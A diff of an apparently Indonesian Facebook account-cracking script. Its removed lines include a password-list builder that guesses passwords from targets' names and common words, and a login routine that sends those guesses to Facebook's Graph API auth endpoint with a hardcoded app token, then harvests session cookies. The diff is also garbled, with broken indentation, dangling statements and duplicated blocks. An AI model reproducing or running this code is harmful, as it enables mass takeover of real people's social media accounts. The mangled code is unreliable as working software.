@@ -307,21 +307,7 @@ class Crack:
 						fall.submit(self.metode_api,user,pwx)
 		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
 		sys.exit()
-					if "api" in self.mtd:
-						fall.submit(self.metode_api,user,pwx)
-					elif "mbasic" in self.mtd:
-						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
-					elif "mobile" in self.mtd:
-						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
-				except:
-					if "api" in self.mtd:
-						fall.submit(self.metode_api,user,pwx)
-					elif "mbasic" in self.mtd:
-						fall.submit(self.metode_aplikasi,user,pwx)
-					elif "mobile" in self.mtd:
-						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
-		exit("\n\n [#] crack selesai....")
-	
+					
 	def metode_api(self,email,pwx):
 		prog.update(des,description=f" {H2}• {P2}[{H2}DensXyz{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
 		prog.advance(des)
@@ -356,83 +342,7 @@ class Crack:
 					user = re.findall("c_user=(\d+)",coki)[0]
 					if user in self.ok or user in self.cp:
 
-								pwx.append("katasandi")
-								pwx.append("pekalongan")
-								pwx.append("semarang")
-						else:
-							if len(depan)<3:
-								pwx.append(nama)
-								pwx.append(nama+"123")
-								pwx.append(nama+"321")
-							else:
-								pwx.append(nama)
-								pwx.append(depan+"123")
-								pwx.append(depan+"321")
-								pwx.append(depan+"1234")
-								pwx.append(depan+"12345")
-								pwx.append("kata sandi")
-								pwx.append("pekalongan")
-								pwx.append("semarang")
-							belakang = nama.split(" ")[1]
-							if len(belakang)<3:
-								pwx.append(depan+belakang)
-								pwx.append(depan+belakang+"123")
-								pwx.append(depan+belakang+"321")
-								pwx.append(depan+belakang+"1234")
-								pwx.append(depan+belakang+"12345")
-							else:
-								pwx.append(depan+belakang)
-								pwx.append(belakang+"123")
-								pwx.append(belakang+"321")
-								pwx.append(belakang+"1234")
-								pwx.append(belakang+"12345")
-								pwx.append("kontol")
-								pwx.append("kontol123")
-								pwx.append("bismillah")
-								pwx.append("mobile legends")
-								pwx.append("batang")
-								pwx.append("pemalang")
-								pwx.append("paninggaran")
-						fall.submit(self.metode_api,user,pwx)
-					except:
-						fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
-	
-	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}• {P2}[{H2}DensXyz{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
-		prog.advance(des)
-		try:
-			for pw in pwx:
-				pw = pw.lower()
-				ua = random.choice(ugent)
-				ua = random.choice(ngentott)
-				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
-					"email": email,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
-				headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": ua,
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
-				if "session_key" in post.text and "EAA" in post.text:
-					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-					user = re.findall("c_user=(\d+)",coki)[0]
-					if user in self.ok or user in self.cp:
-				break
+						break
 					else:
 						self.ok.append(user)
 						tree = Tree(" ",guide_style=f"{color_ok}")
